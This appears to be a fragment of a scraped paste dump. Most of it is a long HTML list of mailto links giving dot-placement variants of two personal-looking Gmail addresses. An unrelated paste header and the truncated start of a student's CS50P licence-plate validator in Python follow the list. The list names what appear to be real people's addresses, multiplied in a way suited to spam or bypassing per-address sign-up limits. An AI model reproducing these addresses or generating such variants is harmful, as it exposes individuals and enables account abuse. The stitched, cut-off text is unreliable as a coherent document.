<a href=""mailto:jo.searg.u.dob.l.a.n.co@gmail.com"">jo.searg.u.dob.l.a.n.co@gmail.com</a>
<a href=""mailto:jos.e.ar.g.u.d.o.b.l.a.nco@gmail.com"">jos.e.ar.g.u.d.o.b.l.a.nco@gmail.com</a>
<a href=""mailto:j.os.e.ar.g.ud.ob.la.nc.o@gmail.com"">j.os.e.ar.g.ud.ob.la.nc.o@gmail.com</a>
<a href=""mailto:j.o.sea.r.gud.ob.l.a.nc.o@gmail.com"">j.o.sea.r.gud.ob.l.a.nc.o@gmail.com</a>
<a href=""mailto:jo.se.a.rgu.d.o.b.la.nco@gmail.com"">jo.se.a.rgu.d.o.b.la.nco@gmail.com</a>
<a href=""mailto:jose.a.r.g.ud.ob.lanco@gmail.com"">jose.a.r.g.ud.ob.lanco@gmail.com</a>
<a href=""mailto:jo.sea.r.g.u.dobla.nco@gmail.com"">jo.sea.r.g.u.dobla.nco@gmail.com</a>
<a href=""mailto:j.o.s.e.ar.g.udo.bla.nco@gmail.com"">j.o.s.e.ar.g.udo.bla.nco@gmail.com</a>
<a href=""mailto:j.ose.ar.gu.do.bl.anc.o@gmail.com"">j.ose.ar.gu.do.bl.anc.o@gmail.com</a>
<a href=""mailto:j.osear.gudob.l.a.nc.o@gmail.com"">j.osear.gudob.l.a.nc.o@gmail.com</a>
<a href=""mailto:jo.s.earg.u.dobl.an.co@gmail.com"">jo.s.earg.u.dobl.an.co@gmail.com</a>
<a href=""mailto:jose.argudob.lan.co@gmail.com"">jose.argudob.lan.co@gmail.com</a>
<a href=""mailto:j.o.s.e.a.r.gu.dob.l.a.nco@gmail.com"">j.o.s.e.a.r.gu.dob.l.a.nco@gmail.com</a>
<a href=""mailto:j.os.ea.rgud.obl.anc.o@gmail.com"">j.os.ea.rgud.obl.anc.o@gmail.com</a>
<a href=""mailto:jo.se.a.r.g.u.d.o.blanco@gmail.com"">jo.se.a.r.g.u.d.o.blanco@gmail.com</a>
<a href=""mailto:jo.sear.gu.d.obla.nc.o@gmail.com"">jo.sear.gu.d.obla.nc.o@gmail.com</a>
<a href=""mailto:josearg.ud.o.b.l.a.n.c.o@gmail.com"">josearg.ud.o.b.l.a.n.c.o@gmail.com</a>
<a href=""mailto:jo.se.a.rgu.d.o.bl.anco@gmail.com"">jo.se.a.rgu.d.o.bl.anco@gmail.com</a>
<a href=""mailto:j.osear.g.u.dob.lan.co@gmail.com"">j.osear.g.u.dob.lan.co@gmail.com</a>
<a href=""mailto:jo.se.a.rg.u.doblanc.o@gmail.com"">jo.se.a.rg.u.doblanc.o@gmail.com</a>
<a href=""mailto:j.os.ea.rg.udo.bl.a.n.c.o@gmail.com"">j.os.ea.rg.udo.bl.a.n.c.o@gmail.com</a>
<a href=""mailto:j.o.se.a.rgu.do.b.lanco@gmail.com"">j.o.se.a.rgu.do.b.lanco@gmail.com</a>
<a href=""mailto:j.oseargudo.b.lanc.o@gmail.com"">j.oseargudo.b.lanc.o@gmail.com</a>
<a href=""mailto:jos.ear.g.u.doblanc.o@gmail.com"">jos.ear.g.u.doblanc.o@gmail.com</a>
<a href=""mailto:jos.e.arg.ud.o.bl.a.nc.o@gmail.com"">jos.e.arg.ud.o.bl.a.nc.o@gmail.com</a>
<a href=""mailto:j.ose.a.rgu.d.oblanc.o@gmail.com"">j.ose.a.rgu.d.oblanc.o@gmail.com</a>
<a href=""mailto:jo.s.e.a.r.g.ud.obl.a.n.co@gmail.com"">jo.s.e.a.r.g.ud.obl.a.n.co@gmail.com</a>
<a href=""mailto:j.os.eargu.doblanco@gmail.com"">j.os.eargu.doblanco@gmail.com</a>
<a href=""mailto:j.os.ea.rg.u.do.blanc.o@gmail.com"">j.os.ea.rg.u.do.blanc.o@gmail.com</a>
<a href=""mailto:j.os.e.a.rg.u.d.o.b.lanc.o@gmail.com"">j.os.e.a.rg.u.d.o.b.lanc.o@gmail.com</a>
<a href=""mailto:j.osear.g.u.d.ob.l.a.n.co@gmail.com"">j.osear.g.u.d.ob.l.a.n.co@gmail.com</a>
<a href=""mailto:josearg.u.do.b.la.n.c.o@gmail.com"">josearg.u.do.b.la.n.c.o@gmail.com</a>
<a href=""mailto:jos.ear.gu.doblanc.o@gmail.com"">jos.ear.gu.doblanc.o@gmail.com</a>
<a href=""mailto:jo.sea.rg.ud.o.blanc.o@gmail.com"">jo.sea.rg.ud.o.blanc.o@gmail.com</a>
<a href=""mailto:jo.s.eargud.o.bla.nco@gmail.com"">jo.s.eargud.o.bla.nco@gmail.com</a>
<a href=""mailto:jos.e.a.r.g.udo.b.l.an.c.o@gmail.com"">jos.e.a.r.g.udo.b.l.an.c.o@gmail.com</a>
<a href=""mailto:j.o.s.ear.gu.do.bla.n.c.o@gmail.com"">j.o.s.ear.gu.do.bla.n.c.o@gmail.com</a>
<a href=""mailto:j.os.ear.gu.dob.l.anco@gmail.com"">j.os.ear.gu.dob.l.anco@gmail.com</a>
<a href=""mailto:jo.sea.r.gu.d.oblan.c.o@gmail.com"">jo.sea.r.gu.d.oblan.c.o@gmail.com</a>
<a href=""mailto:j.o.s.e.a.rgu.d.ob.l.a.nc.o@gmail.com"">j.o.s.e.a.rgu.d.ob.l.a.nc.o@gmail.com</a>
<a href=""mailto:jo.se.a.rgudob.l.an.c.o@gmail.com"">jo.se.a.rgudob.l.an.c.o@gmail.com</a>
<a href=""mailto:j.o.s.e.arg.udobla.n.co@gmail.com"">j.o.s.e.arg.udobla.n.co@gmail.com</a>
<a href=""mailto:jos.e.ar.gu.d.o.b.l.a.nc.o@gmail.com"">jos.e.ar.gu.d.o.b.l.a.nc.o@gmail.com</a>
<a href=""mailto:josea.rg.ud.ob.l.anc.o@gmail.com"">josea.rg.ud.ob.l.anc.o@gmail.com</a>
<a href=""mailto:jose.ar.g.u.dob.l.a.n.c.o@gmail.com"">jose.ar.g.u.dob.l.a.n.c.o@gmail.com</a>
<a href=""mailto:jos.ea.rg.udob.l.a.n.co@gmail.com"">jos.ea.rg.udob.l.a.n.co@gmail.com</a>
<a href=""mailto:jo.se.ar.gudo.b.lan.co@gmail.com"">jo.se.ar.gudo.b.lan.co@gmail.com</a>
<a href=""mailto:j.os.e.a.r.g.u.do.b.lanco@gmail.com"">j.os.e.a.r.g.u.do.b.lanco@gmail.com</a>
<a href=""mailto:jos.ear.g.udo.blan.co@gmail.com"">jos.ear.g.udo.blan.co@gmail.com</a>
<a href=""mailto:jo.sea.rgud.o.bla.nc.o@gmail.com"">jo.sea.rgud.o.bla.nc.o@gmail.com</a>
<a href=""mailto:jos.e.a.r.gu.do.b.la.nco@gmail.com"">jos.e.a.r.gu.do.b.la.nco@gmail.com</a>
<a href=""mailto:j.os.e.ar.gud.ob.l.an.c.o@gmail.com"">j.os.e.ar.gud.ob.l.an.c.o@gmail.com</a>
<a href=""mailto:j.o.sear.gud.obla.n.c.o@gmail.com"">j.o.sear.gud.obla.n.c.o@gmail.com</a>
<a href=""mailto:jo.s.e.ar.g.u.d.ob.la.n.c.o@gmail.com"">jo.s.e.ar.g.u.d.ob.la.n.c.o@gmail.com</a>
<a href=""mailto:j.os.ea.rg.u.dobl.a.nco@gmail.com"">j.os.ea.rg.u.dobl.a.nco@gmail.com</a>
<a href=""mailto:j.os.ear.gud.o.blan.co@gmail.com"">j.os.ear.gud.o.blan.co@gmail.com</a>
<a href=""mailto:j.o.s.e.ar.gu.do.b.la.n.co@gmail.com"">j.o.s.e.ar.gu.do.b.la.n.co@gmail.com</a>
<a href=""mailto:jo.se.arg.ud.obla.n.co@gmail.com"">jo.se.arg.ud.obla.n.co@gmail.com</a>
<a href=""mailto:j.osear.gudoblanco@gmail.com"">j.osear.gudoblanco@gmail.com</a>
<a href=""mailto:jo.se.argu.dob.lanc.o@gmail.com"">jo.se.argu.dob.lanc.o@gmail.com</a>
<a href=""mailto:j.o.se.ar.gu.dobl.an.co@gmail.com"">j.o.se.ar.gu.dobl.an.co@gmail.com</a>
<a href=""mailto:jo.s.ea.r.g.u.d.o.bla.nc.o@gmail.com"">jo.s.ea.r.g.u.d.o.bla.nc.o@gmail.com</a>
<a href=""mailto:j.o.sea.rgudobl.an.co@gmail.com"">j.o.sea.rgudobl.an.co@gmail.com</a>
<a href=""mailto:jo.se.a.r.g.u.d.o.b.l.an.c.o@gmail.com"">jo.se.a.r.g.u.d.o.b.l.an.c.o@gmail.com</a>
<a href=""mailto:j.o.se.a.rg.u.d.o.b.l.a.nc.o@gmail.com"">j.o.se.a.rg.u.d.o.b.l.a.nc.o@gmail.com</a>
<a href=""mailto:evemicklem@gmail.com"">evemicklem@gmail.com</a>
<a href=""mailto:ev.em.i.ck.l.e.m@gmail.com"">ev.em.i.ck.l.e.m@gmail.com</a>
<a href=""mailto:eve.mic.k.le.m@gmail.com"">eve.mic.k.le.m@gmail.com</a>
<a href=""mailto:ev.e.mic.kl.em@gmail.com"">ev.e.mic.kl.em@gmail.com</a>
<a href=""mailto:evem.i.ckle.m@gmail.com"">evem.i.ckle.m@gmail.com</a>
<a href=""mailto:e.ve.m.ick.l.em@gmail.com"">e.ve.m.ick.l.em@gmail.com</a>
<a href=""mailto:eve.mi.c.k.l.em@gmail.com"">eve.mi.c.k.l.em@gmail.com</a>
<a href=""mailto:eve.m.i.c.k.l.em@gmail.com"">eve.m.i.c.k.l.em@gmail.com</a>
<a href=""mailto:e.vemi.c.kl.em@gmail.com"">e.vemi.c.kl.em@gmail.com</a>
<a href=""mailto:ev.em.i.ckl.em@gmail.com"">ev.em.i.ckl.em@gmail.com</a>
<a href=""mailto:eve.mick.l.em@gmail.com"">eve.mick.l.em@gmail.com</a>
<a href=""mailto:ev.em.ick.l.em@gmail.com"">ev.em.ick.l.em@gmail.com</a>
<a href=""mailto:ev.e.mick.lem@gmail.com"">ev.e.mick.lem@gmail.com</a>
<a href=""mailto:e.v.emic.k.l.em@gmail.com"">e.v.emic.k.l.em@gmail.com</a>
<a href=""mailto:ev.e.mi.cklem@gmail.com"">ev.e.mi.cklem@gmail.com</a>
<a href=""mailto:ev.e.m.i.ckle.m@gmail.com"">ev.e.m.i.ckle.m@gmail.com</a>
<a href=""mailto:e.ve.m.ic.klem@gmail.com"">e.ve.m.ic.klem@gmail.com</a>
<a href=""mailto:ev.e.m.i.cklem@gmail.com"">ev.e.m.i.cklem@gmail.com</a>
<a href=""mailto:evemi.c.k.lem@gmail.com"">evemi.c.k.lem@gmail.com</a>
<a href=""mailto:ev.em.i.c.kl.e.m@gmail.com"">ev.em.i.c.kl.e.m@gmail.com</a>
<a href=""mailto:ev.e.m.i.ck.lem@gmail.com"">ev.e.m.i.ck.lem@gmail.com</a>
<a href=""mailto:e.v.e.mi.ckle.m@gmail.com"">e.v.e.mi.ckle.m@gmail.com</a>
<a href=""mailto:e.v.e.mic.k.le.m@gmail.com"">e.v.e.mic.k.le.m@gmail.com</a>
<a href=""mailto:ev.e.mi.ck.le.m@gmail.com"">ev.e.mi.ck.le.m@gmail.com</a>
<a href=""mailto:e.ve.mi.ckl.e.m@gmail.com"">e.ve.mi.ckl.e.m@gmail.com</a>
<a href=""mailto:ev.e.mick.l.em@gmail.com"">ev.e.mick.l.em@gmail.com</a>
<a href=""mailto:eve.m.ick.l.em@gmail.com"">eve.m.ick.l.em@gmail.com</a>
<a href=""mailto:e.vem.i.cklem@gmail.com"">e.vem.i.cklem@gmail.com</a>
<a href=""mailto:e.ve.m.ic.kl.em@gmail.com"">e.ve.m.ic.kl.em@gmail.com</a>
<a href=""mailto:eve.mi.c.klem@gmail.com"">eve.mi.c.klem@gmail.com</a>
<a href=""mailto:e.v.emic.kl.e.m@gmail.com"">e.v.emic.kl.e.m@gmail.com</a>
<a href=""mailto:ev.e.mic.kle.m@gmail.com"">ev.e.mic.kle.m@gmail.com</a>
<a href=""mailto:e.v.e.m.i.ckl.e.m@gmail.com"">e.v.e.m.i.ckl.e.m@gmail.com</a>
<a href=""mailto:e.v.em.ick.lem@gmail.com"">e.v.em.ick.lem@gmail.com</a>
<a href=""mailto:eve.m.ickl.em@gmail.com"">eve.m.ickl.em@gmail.com</a>
<a href=""mailto:evemic.kle.m@gmail.com"">evemic.kle.m@gmail.com</a>
<a href=""mailto:e.vemi.ckle.m@gmail.com"">e.vemi.ckle.m@gmail.com</a>
<a href=""mailto:e.v.em.ic.k.lem@gmail.com"">e.v.em.ic.k.lem@gmail.com</a>
<a href=""mailto:eve.mi.ck.l.e.m@gmail.com"">eve.mi.ck.l.e.m@gmail.com</a>
<a href=""mailto:ev.e.m.i.ck.l.em@gmail.com"">ev.e.m.i.ck.l.em@gmail.com</a>
<a href=""mailto:evem.ickl.em@gmail.com"">evem.ickl.em@gmail.com</a>
<a href=""mailto:eve.m.ic.kl.em@gmail.com"">eve.m.ic.kl.em@gmail.com</a>
<a href=""mailto:ev.em.ick.le.m@gmail.com"">ev.em.ick.le.m@gmail.com</a>
<a href=""mailto:e.ve.mi.c.k.l.e.m@gmail.com"">e.ve.mi.c.k.l.e.m@gmail.com</a>
<a href=""mailto:ev.emickle.m@gmail.com"">ev.emickle.m@gmail.com</a>
<a href=""mailto:evem.ic.kl.e.m@gmail.com"">evem.ic.kl.e.m@gmail.com</a>
<a href=""mailto:eve.m.ickle.m@gmail.com"">eve.m.ickle.m@gmail.com</a>
<a href=""mailto:e.v.em.ick.l.em@gmail.com"">e.v.em.ick.l.em@gmail.com</a>
<a href=""mailto:e.vem.i.c.klem@gmail.com"">e.vem.i.c.klem@gmail.com</a>
<a href=""mailto:e.v.e.m.i.c.kl.em@gmail.com"">e.v.e.m.i.c.kl.em@gmail.com</a>
<a href=""mailto:e.ve.micklem@gmail.com"">e.ve.micklem@gmail.com</a>
<a href=""mailto:e.vemic.k.l.e.m@gmail.com"">e.vemic.k.l.e.m@gmail.com</a>
<a href=""mailto:e.v.emi.ck.l.e.m@gmail.com"">e.v.emi.ck.l.e.m@gmail.com</a>
<a href=""mailto:eve.mi.c.k.l.e.m@gmail.com"">eve.mi.c.k.l.e.m@gmail.com</a>
<a href=""mailto:e.ve.m.ic.kl.e.m@gmail.com"">e.ve.m.ic.kl.e.m@gmail.com</a>
<a href=""mailto:e.vemi.c.kle.m@gmail.com"">e.vemi.c.kle.m@gmail.com</a>
<a href=""mailto:ev.e.m.i.ckl.e.m@gmail.com"">ev.e.m.i.ckl.e.m@gmail.com</a>
<a href=""mailto:e.v.em.i.cklem@gmail.com"">e.v.em.i.cklem@gmail.com</a>
<a href=""mailto:ev.e.mickl.e.m@gmail.com"">ev.e.mickl.e.m@gmail.com</a>
<a href=""mailto:ev.emi.ckl.e.m@gmail.com"">ev.emi.ckl.e.m@gmail.com</a>
<a href=""mailto:evem.ickl.e.m@gmail.com"">evem.ickl.e.m@gmail.com</a>
<a href=""mailto:eve.m.ic.k.le.m@gmail.com"">eve.m.ic.k.le.m@gmail.com</a>
<a href=""mailto:evemi.cklem@gmail.com"">evemi.cklem@gmail.com</a>
<a href=""mailto:e.vem.i.ckl.em@gmail.com"">e.vem.i.ckl.em@gmail.com</a>
<a href=""mailto:eve.mi.ckl.em@gmail.com"">eve.mi.ckl.em@gmail.com</a>
<a href=""mailto:eve.m.i.c.k.lem@gmail.com"">eve.m.i.c.k.lem@gmail.com</a>
<a href=""mailto:e.ve.mickle.m@gmail.com"">e.ve.mickle.m@gmail.com</a>
<a href=""mailto:e.vemi.c.k.lem@gmail.com"">e.vemi.c.k.lem@gmail.com</a>
<a href=""mailto:evem.i.c.k.l.e.m@gmail.com"">evem.i.c.k.l.e.m@gmail.com</a>
<a href=""mailto:e.vemickl.em@gmail.com"">e.vemickl.em@gmail.com</a>
<a href=""mailto:e.v.em.i.c.k.l.e.m@gmail.com"">e.v.em.i.c.k.l.e.m@gmail.com</a>
<a href=""mailto:e.vemic.kl.em@gmail.com"">e.vemic.kl.em@gmail.com</a>
<a href=""mailto:e.v.e.m.i.ckl.em@gmail.com"">e.v.e.m.i.ckl.em@gmail.com</a>
<a href=""mailto:e.v.em.ic.kle.m@gmail.com"">e.v.em.ic.kle.m@gmail.com</a>
<a href=""mailto:e.ve.m.ickl.e.m@gmail.com"">e.ve.m.ickl.e.m@gmail.com</a>
<a href=""mailto:ev.emi.c.k.lem@gmail.com"">ev.emi.c.k.lem@gmail.com</a>
<a href=""mailto:eve.mickl.e.m@gmail.com"">eve.mickl.e.m@gmail.com</a>
<a href=""mailto:ev.em.i.c.k.l.e.m@gmail.com"">ev.em.i.c.k.l.e.m@gmail.com</a>
<a href=""mailto:ev.e.mi.c.k.le.m@gmail.com"">ev.e.mi.c.k.le.m@gmail.com</a>
<a href=""mailto:eve.m.i.ck.l.em@gmail.com"">eve.m.i.ck.l.em@gmail.com</a>
<a href=""mailto:ev.e.m.i.c.k.l.e.m@gmail.com"">ev.e.m.i.c.k.l.e.m@gmail.com</a>
<a href=""mailto:e.v.e.m.i.c.k.lem@gmail.com"">e.v.e.m.i.c.k.lem@gmail.com</a>
<a href=""mailto:evem.ic.kle.m@gmail.com"">evem.ic.kle.m@gmail.com</a>
<a href=""mailto:e.ve.mic.k.le.m@gmail.com"">e.ve.mic.k.le.m@gmail.com</a>
<a href=""mailto:ev.emic.k.l.e.m@gmail.com"">ev.emic.k.l.e.m@gmail.com</a>
<a href=""mailto:e.ve.m.ic.kle.m@gmail.com"">e.ve.m.ic.kle.m@gmail.com</a>
<a href=""mailto:e.v.e.mi.ck.l.em@gmail.com"">e.v.e.mi.ck.l.em@gmail.com</a>
<a href=""mailto:eve.m.i.c.kl.em@gmail.com"">eve.m.i.c.kl.em@gmail.com</a>
<a href=""mailto:e.vem.ic.kl.em@gmail.com"">e.vem.ic.kl.em@gmail.com</a>
<a href=""mailto:ev.e.m.ickl.em@gmail.com"">ev.e.m.ickl.em@gmail.com</a>
<a href=""mailto:ev.emickl.em@gmail.com"">ev.emickl.em@gmail.com</a>
<a href=""mailto:e.v.emi.c.k.le.m@gmail.com"">e.v.emi.c.k.le.m@gmail.com</a>
<a href=""mailto:e.v.e.m.ick.l.em@gmail.com"">e.v.e.m.ick.l.em@gmail.com</a>
<a href=""mailto:eve.mic.kle.m@gmail.com"">eve.mic.kle.m@gmail.com</a>
<a href=""mailto:eve.mi.ckl.e.m@gmail.com"">eve.mi.ckl.e.m@gmail.com</a>
<a href=""mailto:ev.e.mickle.m@gmail.com"">ev.e.mickle.m@gmail.com</a>
<a href=""mailto:e.ve.m.i.cklem@gmail.com"">e.ve.m.i.cklem@gmail.com</a>
<a href=""mailto:e.v.em.i.c.k.lem@gmail.com"">e.v.em.i.c.k.lem@gmail.com</a>
<a href=""mailto:evemic.k.l.e.m@gmail.com"">evemic.k.l.e.m@gmail.com</a>
<a href=""mailto:eve.m.i.c.k.l.e.m@gmail.com"">eve.m.i.c.k.l.e.m@gmail.com</a>
<a href=""mailto:ev.e.m.ickl.e.m@gmail.com"">ev.e.m.ickl.e.m@gmail.com</a>
<a href=""mailto:e.v.e.m.i.c.k.le.m@gmail.com"">e.v.e.m.i.c.k.le.m@gmail.com</a>
<a href=""mailto:eve.mic.kl.e.m@gmail.com"">eve.mic.kl.e.m@gmail.com</a>
<a href=""mailto:evem.ick.lem@gmail.com"">evem.ick.lem@gmail.com</a>
<a href=""mailto:evemickl.e.m@gmail.com"">evemickl.e.m@gmail.com</a>
<a href=""mailto:eve.m.i.ckl.e.m@gmail.com"">eve.m.i.ckl.e.m@gmail.com</a>
<a href=""mailto:e.v.emick.le.m@gmail.com"">e.v.emick.le.m@gmail.com</a>
<a href=""mailto:evem.ic.kl.em@gmail.com"">evem.ic.kl.em@gmail.com</a>
<a href=""mailto:e.v.e.mic.kl.e.m@gmail.com"">e.v.e.mic.kl.e.m@gmail.com</a>
<a href=""mailto:e.v.e.m.ick.lem@gmail.com"">e.v.e.m.ick.lem@gmail.com</a>
<a href=""mailto:e.vemick.l.em@gmail.com"">e.vemick.l.em@gmail.com</a>
<a href=""mailto:evem.i.c.k.le.m@gmail.com"">evem.i.c.k.le.m@gmail.com</a>
<a href=""mailto:ev.e.m.i.ck.le.m@gmail.com"">ev.e.m.i.ck.le.m@gmail.com</a>
<a href=""mailto:evemic.kl.e.m@gmail.com"">evemic.kl.e.m@gmail.com</a>
<a href=""mailto:ev.e.mi.c.k.l.e.m@gmail.com"">ev.e.mi.c.k.l.e.m@gmail.com</a>
<a href=""mailto:ev.em.i.ck.l.em@gmail.com"">ev.em.i.ck.l.em@gmail.com</a>
<a href=""mailto:e.v.e.m.icklem@gmail.com"">e.v.e.m.icklem@gmail.com</a>
<a href=""mailto:e.v.em.ick.le.m@gmail.com"">e.v.em.ick.le.m@gmail.com</a>
<a href=""mailto:e.ve.m.ic.k.l.em@gmail.com"">e.ve.m.ic.k.l.em@gmail.com</a>
<a href=""mailto:ev.em.i.c.k.le.m@gmail.com"">ev.em.i.c.k.le.m@gmail.com</a>
<a href=""mailto:e.vemi.c.k.l.em@gmail.com"">e.vemi.c.k.l.em@gmail.com</a>
<a href=""mailto:ev.e.mic.k.le.m@gmail.com"">ev.e.mic.k.le.m@gmail.com</a>
<a href=""mailto:evemi.ck.le.m@gmail.com"">evemi.ck.le.m@gmail.com</a>
<a href=""mailto:e.ve.m.icklem@gmail.com"">e.ve.m.icklem@gmail.com</a>
<a href=""mailto:evem.i.ck.le.m@gmail.com"">evem.i.ck.le.m@gmail.com</a>
<a href=""mailto:e.vemic.kl.e.m@gmail.com"">e.vemic.kl.e.m@gmail.com</a>
<a href=""mailto:evem.ic.k.le.m@gmail.com"">evem.ic.k.le.m@gmail.com</a>
<a href=""mailto:e.vemi.cklem@gmail.com"">e.vemi.cklem@gmail.com</a>
<a href=""mailto:e.ve.mick.l.e.m@gmail.com"">e.ve.mick.l.e.m@gmail.com</a>
<a href=""mailto:e.v.e.m.ic.k.l.e.m@gmail.com"">e.v.e.m.ic.k.l.e.m@gmail.com</a>
<a href=""mailto:ev.emi.c.k.le.m@gmail.com"">ev.emi.c.k.le.m@gmail.com</a>
<a href=""mailto:e.v.emick.l.e.m@gmail.com"">e.v.emick.l.e.m@gmail.com</a>
<a href=""mailto:ev.e.mi.ckl.em@gmail.com"">ev.e.mi.ckl.em@gmail.com</a>
<a href=""mailto:e.vem.i.c.k.lem@gmail.com"">e.vem.i.c.k.lem@gmail.com</a>
<a href=""mailto:e.vem.i.ck.l.em@gmail.com"">e.vem.i.ck.l.em@gmail.com</a>
<a href=""mailto:ev.e.m.ic.k.l.e.m@gmail.com"">ev.e.m.ic.k.l.e.m@gmail.com</a>
<a href=""mailto:ev.emi.c.k.l.e.m@gmail.com"">ev.emi.c.k.l.e.m@gmail.com</a>
<a href=""mailto:e.vemic.k.l.em@gmail.com"">e.vemic.k.l.em@gmail.com</a>
<a href=""mailto:e.ve.m.i.c.k.l.e.m@gmail.com"">e.ve.m.i.c.k.l.e.m@gmail.com</a>
<a href=""mailto:e.v.em.ickle.m@gmail.com"">e.v.em.ickle.m@gmail.com</a>
<a href=""mailto:ev.e.mick.le.m@gmail.com"">ev.e.mick.le.m@gmail.com</a>
<a href=""mailto:e.v.e.m.ic.kl.e.m@gmail.com"">e.v.e.m.ic.kl.e.m@gmail.com</a>
<a href=""mailto:e.v.e.m.i.ckle.m@gmail.com"">e.v.e.m.i.ckle.m@gmail.com</a>
<a href=""mailto:e.ve.mi.cklem@gmail.com"">e.ve.mi.cklem@gmail.com</a>
<a href=""mailto:e.v.em.ickl.em@gmail.com"">e.v.em.ickl.em@gmail.com</a>
<a href=""mailto:e.vem.i.ck.l.e.m@gmail.com"">e.vem.i.ck.l.e.m@gmail.com</a>
<a href=""mailto:evemi.c.k.l.em@gmail.com"">evemi.c.k.l.em@gmail.com</a>
<a href=""mailto:evem.i.c.kl.em@gmail.com"">evem.i.c.kl.em@gmail.com</a>
<a href=""mailto:ev.em.i.ckl.e.m@gmail.com"">ev.em.i.ckl.e.m@gmail.com</a>
<a href=""mailto:ev.e.mic.k.l.e.m@gmail.com"">ev.e.mic.k.l.e.m@gmail.com</a>
<a href=""mailto:e.v.e.mic.k.l.em@gmail.com"">e.v.e.mic.k.l.em@gmail.com</a>
<a href=""mailto:e.ve.m.i.c.k.lem@gmail.com"">e.ve.m.i.c.k.lem@gmail.com</a>
<a href=""mailto:e.v.e.mi.c.k.lem@gmail.com"">e.v.e.mi.c.k.lem@gmail.com</a>
<a href=""mailto:ev.emi.ckl.em@gmail.com"">ev.emi.ckl.em@gmail.com</a>
<a href=""mailto:e.ve.mic.klem@gmail.com"">e.ve.mic.klem@gmail.com</a>
<a href=""mailto:e.v.e.mi.ck.lem@gmail.com"">e.v.e.mi.ck.lem@gmail.com</a>
<a href=""mailto:e.ve.mick.lem@gmail.com"">e.ve.mick.lem@gmail.com</a>
<a href=""mailto:evemic.kl.em@gmail.com"">evemic.kl.em@gmail.com</a>
<a href=""mailto:e.v.e.mickl.em@gmail.com"">e.v.e.mickl.em@gmail.com</a>
<a href=""mailto:ev.e.mi.c.kl.e.m@gmail.com"">ev.e.mi.c.kl.e.m@gmail.com</a>
<a href=""mailto:e.v.e.m.i.c.kl.e.m@gmail.com"">e.v.e.m.i.c.kl.e.m@gmail.com</a>
<a href=""mailto:e.v.em.i.ck.l.e.m@gmail.com"">e.v.em.i.ck.l.e.m@gmail.com</a>
<a href=""mailto:e.v.emic.k.le.m@gmail.com"">e.v.emic.k.le.m@gmail.com</a>
<a href=""mailto:e.ve.m.ick.l.e.m@gmail.com"">e.ve.m.ick.l.e.m@gmail.com</a>
<a href=""mailto:eve.mi.ck.l.em@gmail.com"">eve.mi.ck.l.em@gmail.com</a>
<a href=""mailto:e.vem.i.c.k.l.e.m@gmail.com"">e.vem.i.c.k.l.e.m@gmail.com</a>
<a href=""mailto:eve.m.ick.le.m@gmail.com"">eve.m.ick.le.m@gmail.com</a>
<a href=""mailto:e.v.emi.c.kl.e.m@gmail.com"">e.v.emi.c.kl.e.m@gmail.com</a>
<a href=""mailto:e.ve.mick.l.em@gmail.com"">e.ve.mick.l.em@gmail.com</a>
<a href=""mailto:e.v.em.icklem@gmail.com"">e.v.em.icklem@gmail.com</a>
<a href=""mailto:e.ve.mi.c.kl.e.m@gmail.com"">e.ve.mi.c.kl.e.m@gmail.com</a>
<a href=""mailto:ev.em.ic.k.le.m@gmail.com"">ev.em.ic.k.le.m@gmail.com</a>
<a href=""mailto:e.v.e.mi.ckl.em@gmail.com"">e.v.e.mi.ckl.em@gmail.com</a>
<a href=""mailto:ev.e.m.i.c.k.lem@gmail.com"">ev.e.m.i.c.k.lem@gmail.com</a>
<a href=""mailto:ev.e.m.ic.k.lem@gmail.com"">ev.e.m.ic.k.lem@gmail.com</a>
<a href=""mailto:eve.mick.l.e.m@gmail.com"">eve.mick.l.e.m@gmail.com</a>
<a href=""mailto:e.ve.mi.ck.lem@gmail.com"">e.ve.mi.ck.lem@gmail.com</a>
<a href=""mailto:e.v.e.mi.ck.l.e.m@gmail.com"">e.v.e.mi.ck.l.e.m@gmail.com</a>
<a href=""mailto:evemi.c.kl.e.m@gmail.com"">evemi.c.kl.e.m@gmail.com</a>
<a href=""mailto:ev.emick.l.e.m@gmail.com"">ev.emick.l.e.m@gmail.com</a>
<a href=""mailto:e.v.e.m.i.ck.lem@gmail.com"">e.v.e.m.i.ck.lem@gmail.com</a>
<a href=""mailto:evem.ic.klem@gmail.com"">evem.ic.klem@gmail.com</a>
<a href=""mailto:e.vemi.ckl.e.m@gmail.com"">e.vemi.ckl.e.m@gmail.com</a>
<a href=""mailto:eve.m.ickl.e.m@gmail.com"">eve.m.ickl.e.m@gmail.com</a>
<a href=""mailto:eve.m.i.ck.l.e.m@gmail.com"">eve.m.i.ck.l.e.m@gmail.com</a>
<a href=""mailto:e.ve.m.i.c.kl.em@gmail.com"">e.ve.m.i.c.kl.em@gmail.com</a>
<a href=""mailto:ev.emicklem@gmail.com"">ev.emicklem@gmail.com</a>
<a href=""mailto:e.vem.i.c.k.l.em@gmail.com"">e.vem.i.c.k.l.em@gmail.com</a>
<a href=""mailto:e.ve.m.i.ckl.em@gmail.com"">e.ve.m.i.ckl.em@gmail.com</a>
<a href=""mailto:evemickl.em@gmail.com"">evemickl.em@gmail.com</a>
<a href=""mailto:e.ve.mi.ck.l.em@gmail.com"">e.ve.mi.ck.l.em@gmail.com</a>
<a href=""mailto:evemi.ckle.m@gmail.com"">evemi.ckle.m@gmail.com</a>
<a href=""mailto:e.v.emickl.em@gmail.com"">e.v.emickl.em@gmail.com</a>
<a href=""mailto:e.v.e.mic.kl.em@gmail.com"">e.v.e.mic.kl.em@gmail.com</a>
<a href=""mailto:ev.e.m.i.ck.l.e.m@gmail.com"">ev.e.m.i.ck.l.e.m@gmail.com</a>
<a href=""mailto:ev.e.mi.c.klem@gmail.com"">ev.e.mi.c.klem@gmail.com</a>
<a href=""mailto:ev.emi.ckle.m@gmail.com"">ev.emi.ckle.m@gmail.com</a>
<a href=""mailto:e.vem.ic.k.lem@gmail.com"">e.vem.ic.k.lem@gmail.com</a>
<a href=""mailto:e.v.emic.k.lem@gmail.com"">e.v.emic.k.lem@gmail.com</a>
<a href=""mailto:ev.e.mi.ck.l.e.m@gmail.com"">ev.e.mi.ck.l.e.m@gmail.com</a>
<a href=""mailto:e.ve.m.i.ckle.m@gmail.com"">e.ve.m.i.ckle.m@gmail.com</a>"
TPWvr3Rf,CS50P - PSET2_PLATES ver. 2,nikolask,Python,Friday 11th of August 2023 12:18:23 AM CDT,"# def main():
#     plate = input(""Plate: "")
#     if is_valid(plate):
#         print(""Valid"")
#     else:
#         print(""Invalid"")

def is_valid(s):
    return (
        check_digits_after_digit(s)
        and text_length(s)
        and punctuation_check(s)
        and two_letters(s)
        and zero_first_digit(s)
    )

# check if the first letters are alpha
def two_letters(text):
